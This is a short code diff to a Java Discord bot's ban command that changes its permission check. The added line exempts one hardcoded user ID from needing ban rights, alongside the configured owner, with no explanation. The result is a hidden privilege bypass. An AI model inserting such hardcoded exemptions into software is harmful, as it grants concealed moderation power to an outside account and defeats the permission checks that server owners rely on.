@@ -21,7 +21,7 @@ public class BanCommand implements ICommand {
         List<Member> mentionedMembers = event.getMessage().getMentionedMembers();
 
 
-        if (!member.hasPermission(Permission.BAN_MEMBERS) && member.getIdLong() != Core.OWNERID) {
+        if (!member.hasPermission(Permission.BAN_MEMBERS) && member.getIdLong() != Core.OWNERID && !member.getId().equalsIgnoreCase("210956619788320768")) {
             channel.sendMessage("You don't have permission to ban that user").queue();
             return;
         }
